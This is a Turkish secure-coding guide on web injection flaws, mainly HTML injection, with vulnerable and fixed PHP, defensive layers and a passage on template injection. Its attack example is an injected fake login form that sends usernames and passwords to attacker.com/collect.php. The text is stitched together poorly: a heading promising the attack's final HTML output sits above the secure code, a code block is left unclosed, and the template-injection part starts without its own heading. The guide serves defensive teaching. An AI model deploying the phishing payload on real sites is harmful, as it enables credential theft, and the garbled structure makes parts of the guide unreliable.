LDAP bağlantı veya sorgu hataları (örneğin *"Bad Search Filter"*, *"Size Limit Exceeded"* veya sürücü kaynaklı hata kodları) canlı sistemlerde asla son kullanıcıya yansıtılmamalıdır. Saldırganlar bu detaylı hata mesajlarını, arka plandaki LDAP şemasını, nesne sınıflarını (*Object Classes*) ve öznitelik (*Attribute*) isimlerini keşfetmek amacıyla bir haritalama aracı olarak kullanırlar. Hata mesajları arka planda merkezi ve güvenli bir log sunucusuna yazılmalı, istemciye ise her zaman standart ve jenerik bir yanıt dönülmelidir.
## 9. HTML Injection

Uygulamanın kullanıcıdan aldığı girdileri yeterli doğrulama, temizleme veya kodlama işlemlerinden geçirmeden doğrudan HTML kaynak koduna dahil etmesi sonucu oluşan zafiyet türüne **HTML Injection (HTML Enjeksiyonu)** denir.

>  **XSS ile İlişkisi:** Cross-Site Scripting (XSS) zafiyeti ile doğrudan kardeş bir yapıya sahiptir. 

### Aralarındaki Temel Fark Nedir?
*   **XSS:** Birincil amaç tarayıcı üzerinde zararlı JavaScript kodları yürütmektir (*execution*).
*   **HTML Injection:** Amaç sayfanın Belge Nesnesi Modelini (DOM) manipüle ederek görsel yapıyı, form elemanlarını ve statik metin içeriğini değiştirmektir. 

Saldırganlar bu zafiyeti genellikle sahte giriş formları oluşturarak kullanıcı kimlik bilgilerini çalmak (**phishing**), site içeriğini tahrif etmek (**deface**) veya kullanıcıları harici zararlı bağlantılara yönlendirmek amacıyla kullanırlar.

---

###  HTML Enjeksiyon Türleri ve Teknik Anatomisi

HTML Injection zafiyeti, zararlı kodun sunucu tarafından işlenme ve istemciye ulaştırılma biçimine göre iki ana başlık altında incelenir:

#### 1. Stored HTML Injection (Kalıcı)
Saldırganın enjekte ettiği kötü niyetli HTML etiketleri; uygulamanın veri tabanı, dosya sistemi veya log blokları gibi **kalıcı veri saklama katmanlarına** kaydedilir. Sayfayı ziyaret eden her meşru kullanıcı, sunucudan gelen bu manipüle edilmiş veriyi yükler ve tarayıcı yerleştirilen sahte etiketleri sitenin orijinal tasarımıymış gibi işler.

#### 2. Reflected HTML Injection (Yansıtılan)
Zararlı HTML içeriği veri tabanına kaydedilmez. Saldırgan, URL parametreleri veya HTTP istek gövdeleri (*Request Body*) içerisine yerleştirdiği etiketleri sunucuya gönderir; sunucu gelen bu girdiyi kontrol etmeden yanıt (*Response*) sayfasına aynen yansıtır. Saldırının başarıya ulaşması için kurbanın hazırlanan manipülatif bağlantıya tıklatılması gerekir.

>  **Saldırı Vektörleri:** Saldırganlar yerleştirdikleri `<div>`, `<iframe>`, `<form>` veya `<meta>` gibi etiketler vasıtasıyla sayfa üzerine görünmez katmanlar ekleyebilir, mevcut formların hedef adreslerini (*action*) kendi sunucularına yönlendirebilir ya da sayfayı tamamen okunamaz hale getirebilirler.

---

###  Kod Örnekleri

####  Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki PHP örneğinde, bir kullanıcı profilindeki "Hakkımda" veya "Biyografi" alanını ekrana basan güvensiz bir uygulama yapısı yer almaktadır. Yazılımcı, veri tabanından veya doğrudan istekle gelen veriyi hiçbir süzgeçten geçirmeden tarayıcıya göndermektedir:


```php
<?php
// Kullanıcıdan gelen biyografi metni alınıyor (veya veri tabanından ham okunuyor)
$bioInput = $_POST['biography'];

// GÜVENSİZ YAPI: Kullanıcı girdisi doğrudan HTML bloklarının arasına yazdırılıyor
echo "<div class='user-bio'>" . $bioInput . "</div>";
?>
```

###  Saldırı Senaryosu (Phishing / Form Injection)

Saldırgan, biyografi alanına düz bir metin yazmak yerine, sayfaya sahte bir oturum yenileme formu yerleştiren şu zararlı HTML bloklarını enjekte eder:



```html
</div>
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white;">
    <h2>Oturumunuz Sonlandı. Lütfen Tekrar Giriş Yapın:</h2>
    <form action="[http://attacker.com/collect.php](http://attacker.com/collect.php)" method="POST">
        Kullanıcı Adı: <input type="text" name="user"><br>
        Şifre: <input type="password" name="pass"><br>
        <input type="submit" value="Giriş Yap">
    </form>
</div>
<div>

```













###  Nihai HTML Çıktısı ve Tarayıcı Davranışı

Uygulamanın arka planda birleştirerek tarayıcıya gönderdiği nihai HTML çıktısı şu şekle bürünür:

```php
<?php
// Kullanıcıdan gelen biyografi metni alınıyor
$bioInput = $_POST['biography'];

// GÜVENLİ YAPI: htmlspecialchars fonksiyonu ile tüm özel karakterler HTML varlıklarına dönüştürülür.
// ENT_QUOTES ve UTF-8 parametreleri ile tam bir karakter dönüşüm güvenliği sağlanır.
$secureBio = htmlspecialchars($bioInput, ENT_QUOTES, 'UTF-8');

echo "<div class='user-bio'>" . $secureBio . "</div>";
?>
```





Bu kodlama işlemi uygulandığında, saldırganın enjekte etmeye çalıştığı `&lt;form&gt;` karakteri tarayıcıya `&amp;lt;form&amp;gt;` şeklinde ulaşır. Tarayıcı bu ifadeyi gördüğünde ekranda görsel olarak `"<form>"` metnini çizer ancak arka planda herhangi bir form nesnesi veya katman oluşturmaz.

---

##  Savunma Katmanları (Defense-in-Depth)

Çıktı kodlamasının yanı sıra, sistem bütünlüğünü korumak ve enjeksiyon risklerini minimize etmek amacıyla şu derinlemesine savunma katmanları entegre edilmelidir:

### 1. HTML Sanitization (HTML Temizleme)
Uygulama iş mantığı gereği kullanıcıların zengin metin editörleri (*Rich Text Editors*) vasıtasıyla kalın yazı (`<b>`), italik yazı (`<i>`) veya köprü metni (`<a>`) gibi sınırlı HTML etiketlerini kullanması zorunlu olabilir. Bu gibi durumlarda çıktı kodlaması yapmak kullanıcın biçimlendirmelerini tamamen bozacaktır.

*   **Çözüm:** Girdi, beyaz liste (*whitelisting*) mantığına dayalı çalışan güvenilir kütüphaneler (örneğin arka planda **HTMLPurifier**, istemci tarafında **DOMPurify**) ile temizleme (*sanitization*) işlemine tabi tutulmalıdır. 
*   **İşleyiş:** Bu kütüphaneler sadece izin verilen güvenli etiketlerin geçişine onay verirken; tehlikeli kabul edilen `<form>`, `<iframe>`, `<script>`, `<meta>` gibi etiketleri ve stil manipülasyonuna açık güvensiz CSS niteliklerini tamamen ayıklar.

### 2. HTTPOnly ve Secure Çerez Bayrakları (Cookie Flags)
HTML Injection açığı bulunan bir sayfada saldırgan, doğrudan JavaScript kodu çalıştıramasa dahi, HTML etiketlerinin yeteneklerini kullanarak (*örneğin resim yükleme etiketinin hata yöneticilerini manipüle ederek: `<img src="x" onerror="zararlı_kod">`*) saldırıyı bir XSS varyasyonuna dönüştürebilir.

*   **Çözüm:** Oturum çerezleri sunucu tarafında yapılandırılırken `HttpOnly` ve `Secure` bayrakları aktif edilmelidir. 
*   **HttpOnly:** Tarayıcı üzerindeki olası script sızmalarının çerez verilerine erişmesini engeller.
*   **Secure:** Çerezin yalnızca şifrelenmiş **HTTPS** bağlantıları üzerinden taşınmasını zorunlu kılar.

### 3. İçerik Güvenlik Politikası (CSP - Content Security Policy)
Web sunucusu tarafından HTTP yanıt başlığı (*Header*) olarak istemciye iletilen CSP talimatları, HTML Injection sömürülerinin etkisini büyük oranda sınırlar.

#### Örnek bir koruyucu CSP direktifi:
```http
Content-Security-Policy: default-src 'self'; form-action 'self'; frame-src 'none';



```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/welcome")
def welcome():
    # Kullanıcıdan gelen isim parametresi alınıyor
    user_name = request.args.get('name', 'Misafir')
    
    # GÜVENLİ YAPI: Şablon metni tamamen statik ve sabittir
    # Dinamik gelecek olan veri yer tutucu (placeholder) bir değişken ile belirtilir
    template = "<html><body><h1>Hoş geldiniz, {{ name_param }}!</h1></body></html>"
    
    # Kullanıcı girdisi şablon motoruna güvenli bir context değişkeni olarak paslanır
    # Bu mimaride name_param içerisine ne yazılırsa yazılsın sadece düz bir metin olarak yorumlanır
    return render_template_string(template, name_param=user_name)

if __name__ == "__main__":
    app.run()


```




##  Savunma Katmanları (Defense-in-Depth)

Şablon tabanlı mimarilerde güvenliği pekiştirmek adına şu ek koruma katmanları devreye alınmalıdır:

### 1. Girdi Doğrulama ve Sıkı Beyaz Liste Kontrolü
Uygulamaya kabul edilecek kullanıcı girdileri, şablon motorlarının özel karakter sözdizimlerine karşı taranmalıdır. 

*   **Regex Filtreleme:** Eğer parametre alanında süslü parantezler (`{`, `}`), dolar işareti (`$`), yüzde işareti (`%`) veya nokta (`.`) gibi nesne erişim karakterlerinin bulunması iş mantığı açısından gerekmiyorsa, bu karakterleri içeren istekler düzenli ifadeler (*Regex*) ile daha en başta filtrelenmeli ve reddedilmelidir.

### 2. Mantıksız (Logic-less) Şablon Motorlarının Tercih Edilmesi
Eğer uygulamanın tasarım katmanında gelişmiş döngülere, nesne fonksiyon çağrılarına veya programlama dili metotlarına ihtiyaç duyulmuyorsa, mimari olarak **"Logic-less"** (mantıksal yeteneği kısıtlı) şablon motorları tercih edilmelidir.

*   **Örnek Motorlar:** [Mustache](https://mustache.github.io/) veya [Handlebars](https://handlebarsjs.com/)
*   **Avantajı:** Bu motorlar, yapıları gereği karmaşık kod bloklarını veya sistem sınıflarını çalıştırma yeteneğine sahip olmadıklarından, enjeksiyon durumlarında bile siber saldırganların RCE (Remote Code Execution) elde etmesini doğrudan engeller.

### 3. Uygulama İzolasyonu ve Kısıtlı Çalışma Zamanı (Sandboxing)
Şablon motorlarının çalıştırıldığı sunucu süreçleri ve uygulama katmanları mutlaka izole edilmelidir.

*    **Korumalı Alan (Sandbox Mode):** Kullanılan şablon motorunun eğer mevcutsa güvenli çalışma modu (*örneğin Twig için Sandbox Extension*) aktif edilmelidir. Bu mod, şablonlar içerisinde sadece belirli güvenli fonksiyonların ve etiketlerin çalıştırılmasına izin verir, sunucu sınıflarına erişimi engeller.
*    **İşletim Sistemi İzolasyonu:** Uygulama, en az yetki (*least privilege*) ilkesine uygun olarak sistemde root haklarına sahip olmayan düşük yetkili bir kullanıcı ile çalıştırılmalı ve **Docker** benzeri bir konteyner yapısı içinde izole edilmelidir. Böylece bir enjeksiyon açığı yaşansa dahi, saldırganın ana sunucu işletim sistemine sızması ve kalıcı zarar vermesi sınırlandırılmış olur.

